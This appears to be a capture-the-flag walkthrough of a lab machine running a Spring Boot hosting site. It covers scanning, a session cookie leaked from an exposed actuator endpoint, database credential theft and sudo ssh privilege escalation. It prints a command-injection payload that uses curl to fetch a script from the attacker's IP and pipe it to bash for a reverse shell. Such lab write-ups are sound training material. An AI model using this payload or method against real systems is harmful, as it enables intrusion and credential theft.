**ip of the machine :- 10.129.2.185**

![](attachment/fa7a60e2fe1bcaa2a1356bb86d06678e.png)
machine is on!!!

![](attachment/0d311e9a7c05499352232ef5959f4026.png)
Got two open ports as usual...

![](attachment/f654889b58a5f49df36e8eeba367fb31.png)
Did an aggressive scan and found the version of the services running on the ports...

![](attachment/ad6dd5047f1b95746d1e773ee96bc1bb.png)
adding ip in /etc/hosts file..

![](attachment/2f23cc77320697780b9e411dde94fa15.png)
It's like a hosting website or somethin'

![](attachment/d00a663fff7c63e965196c7973db5dac.png)
Found some directories, let's explore them...

![](attachment/445717f95c24cff166a275b504889993.png)
Found a login page in /admin and same in /login and /logout but admin:admin didn't work so, let's find out another way to get in.

![](attachment/ad74ef79c6ce4c0bd67102e5b7748b54.png)
So went to /error and it gave a Whitelabel error...

![](attachment/d2f3fc120d35fd48e1dd0891e7ab1333.png)
So a whitelabel error page is in spring boot application, so does that mean it is running spring boot on back end??

![](attachment/226b1bb344aa78ccec82372ec7038285.png)
So used ffuf to find common spring boot directories and files and got some...

![](attachment/2a9ec81394ea655a85da13a241524da5.png)
So directory actuator was exposed and it's further files, so searched for what is actuator so it revealed that how spring boot application are actually working or simply operation info. which is interesting.

![](attachment/31567d364028bb5ff947a3f4ccad0f52.png)
Got a lot in actuator to explore and sessions look pretty interesting for possible session cookies...

![](attachment/660fe63e093142c28c906d4c53495b76.png)
Got a session cookie in /actuator/sessions...

![](attachment/dfc3dda3f34810983a12110966585861.png)
So added the session cookie and now we can see there is no login page coming so let's go for /admin...

![](attachment/078962811c777fc0a10ae505bb322336.png)
Got in /admin now...

![](attachment/4e9de371a9eb05ea71f4047832daa8d3.png)
we can reach the machine by using curl command in the input fields.....

![](attachment/2fa16c6bb7a5537f21c1f8eeacec01db.png)
made a rev.sh script and curled it on the web interface..
test;curl${IFS}http://10.10.14.42:9999/rev.sh|bash;
So we curled and got rev shell in the server and executed it using bash.
${IFS} for no inverted comma arguments...

![](attachment/d339a89aaf197587639a269d747c0229.png)
got rev shell...

![](attachment/3aea1409dc226f8b090f8057713a52c1.png)
Found a file in which we reverse shelld...

![](attachment/afa88b90e052f16d26091b87857336b1.png)
So extracted the jar file using unzip command and then started digging in the extracted stuff and found a file with credentials to postgres sql database. So this machine is running postgres sql in the back end as the database. Let's try to login in the database then...

![](attachment/97b806398e95fae0984bd4c358fc94cd.png)
Logged in into postgres sql database server...

![](attachment/99ed1eed2f71abc5dcec78883f0ee1f2.png)
Got a list of databases in the database server.

![](attachment/1ed3ce01d6e58e708f8856a505b7d231.png)
connected to database postgres now...

![](attachment/3d2bd25cff760385b849c8e5b2c17339.png)
Connected to cozyhosing database and it showed two tables...

![](attachment/a8d5d8f2b2a3756643be5c21bddb4e4e.png)
Got two hashes.... Let's try to crack them...

![](attachment/2e1eb99efd7fc65020df1e9561dd2972.png)
Cracked password of the admin...

![](attachment/53aa770d3f9ff86c3d1f37019ae65927.png)
there is only one user josh in the system. So maybe josh is the admin...

![](attachment/c9ea2522c32704fe99d86d1d857e37e5.png)
was write, logged in as user "josh"...

![](attachment/1ab8166ea444261ced9aaa79e581115f.png)
Got our first flag...

![](attachment/b7319908f035a56fe15f5444f19f2839.png)
use can only run /usr/bin/ssh as root...

![](attachment/14936a84214f2b0a19561e923d4c501a.png)
So went to GTFObins and found the solution of how to escalate privileges...

![](attachment/36b8955e9ea9941b949665563f44eb65.png)
Escalated privileges and as well as got our last flag...